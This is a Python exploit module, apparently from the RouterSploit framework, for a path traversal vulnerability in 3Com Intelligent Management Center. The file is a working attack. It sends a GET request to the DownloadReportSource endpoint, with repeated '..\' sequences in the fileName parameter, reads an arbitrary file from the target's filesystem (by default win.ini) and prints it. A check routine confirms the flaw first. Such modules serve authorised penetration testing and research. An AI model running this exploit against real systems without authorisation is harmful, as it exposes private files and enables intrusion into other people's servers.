from routersploit import (
    exploits,
    print_status,
    print_error,
    print_info,
    print_success,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for 3Com Intelligent Management Center Path Traversal vulnerability.
    If the target is vulnerable it is possible to read file from the filesystem.
    """
    __info__ = {
        'name': '3Com IMC Path Traversal',
        'description': 'Exploits 3Com Intelligent Management Center path traversal vulnerability. '
                       'If the target is vulnerable it is possible to read file from the filesystem.',
        'authors': [
            'Richard Brain',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/12679/',
        ],
        'devices': [
            '3Com Intelligent Management Center',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(8080, 'Target port')  # default port
    filename = exploits.Option('\\windows\\win.ini', 'File to read from the filesystem')

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            url = "{}:{}/imc/report/DownloadReportSource?dirType=webapp&fileDir=reports&fileName=reportParaExample.xml..\..\..\..\..\..\..\..\..\..{}".format(self.target, self.port, self.filename)

            print_status("Sending paylaod request")
            response = http_request(method="GET", url=url)
            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                print_success("Exploit success - reading {} file".format(self.filename))
                print_info(response.text)
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        url = "{}:{}/imc/report/DownloadReportSource?dirType=webapp&fileDir=reports&fileName=reportParaExample.xml..\..\..\..\..\..\..\..\..\..\windows\win.ini".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and "[fonts]" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
